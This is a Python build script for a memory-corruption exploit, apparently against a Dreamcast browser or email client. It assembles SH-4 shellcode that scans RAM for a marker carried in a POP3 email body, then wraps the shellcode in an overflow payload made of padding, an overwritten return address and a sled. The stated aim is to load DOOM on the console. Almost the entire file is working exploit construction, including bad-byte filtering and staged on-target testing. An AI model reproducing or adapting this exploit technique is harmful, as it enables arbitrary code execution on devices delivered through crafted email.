#!/usr/bin/env python3
"""
Build the self-contained DOOM-loader payload + the carried data blob.

Delivery: the email carries (in a MIME body part) the literal magic "DCDOOMGO"
followed by a HEX stream of [doom_len(4) | wad_len(4) | doom.bin | wad]. Hex avoids
CR/LF/'.'/NUL so it survives POP3; the stub hex-decodes (skipping non-hex bytes).

Stages (build separately for incremental on-target testing):
  scan   : scan RAM for "DCDOOMGO"; write its address to MARKER (0x8C3F0000); spin.
           Proves the email body is reachable from our shellcode + where it lands.
  (full copy/jump stage added after scan is confirmed)
"""
import sys, struct
sys.path.insert(0, "/media/adversary/Storage/dc_browser_extract/poc")
import sh4_asm as A
from sh4_asm import (load_reg, assemble, LABEL, BF, BT, BRA,
                     I_movb_at, I_extub, I_cmpeqi, I_mov, I_addi, I_cmphs,
                     I_movl_st, I_nop, I_jmp)

MAGIC = b"DCDOOMGO"                      # 44 43 44 4F 4F 4D 47 4F (all byte-safe, no CR/LF/.)
MARKER = 0x8C3F0000
SCAN_LO, SCAN_HI = 0x8C400000, 0x8CFF0000   # widened
PR_DEFAULT = 0x8C3CC444
SLED = A.w(0x6003)

def scan_stub():
    items = []
    items += A.mask_irq()                # SR.BL=1 -> no interrupts during the long scan
    items += [load_reg(2, SCAN_LO)]      # r2 = scan ptr
    items += [load_reg(3, SCAN_HI)]      # r3 = end
    items += [LABEL("outer")]
    # compare MAGIC bytes at r2.. using r1 as cursor
    items += [I_mov(2,1)]                 # r1 = r2
    for i,ch in enumerate(MAGIC):
        items += [I_movb_at(1,0), I_extub(0,0), I_cmpeqi(ch), BF("next")]
        if i != len(MAGIC)-1:
            items += [I_addi(1,1)]        # r1++
    items += [BRA("found")]
    items += [LABEL("next")]
    items += [I_addi(1,2)]               # r2++
    items += [I_cmphs(3,2)]              # T if r2 >= r3
    items += [BF("outer")]              # if r2<r3 keep scanning
    # not found -> write 0xD1EDD1ED to marker (store via @r1, data in r4: byte-safe regs)
    items += [load_reg(1, MARKER), load_reg(4, 0xD1EDD1ED), I_movl_st(4,1), BRA("spin")]
    items += [LABEL("found")]
    items += [load_reg(1, MARKER), I_mov(2,4), I_movl_st(4,1)]   # *MARKER = found addr (r2->r4->@r1)
    items += [LABEL("spin"), BRA("spin"), I_nop()]
    code, bad = A.assemble_safe(items)
    return code, bad

def payload(stub, pr=PR_DEFAULT, sled=0x2000, pad=64):
    p = b"A"*pad + struct.pack("<I", pr) + SLED*(sled//2) + stub
    bad = [i for i,c in enumerate(p) if c in A.BAD]
    return p, bad

def make_blob_scan():
    # stage-A blob: just the magic + a tiny hex tail
    return MAGIC + b"deadbeef"

if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "scan"
    if mode == "scan":
        stub, sbad = scan_stub()
        print("scan stub %d bytes, byte-safe: %s%s" %
              (len(stub), not sbad, ("  BAD@"+str(sbad[:6]) if sbad else "")))
        print("stub hex:", stub.hex())
        p, pbad = payload(stub)
        print("payload %d bytes, byte-safe: %s%s" %
              (len(p), not pbad, ("  BAD@"+str(pbad[:6]) if pbad else "")))
        print("HEXFILE:" + p.hex())
        print("BLOB:" + make_blob_scan().decode())
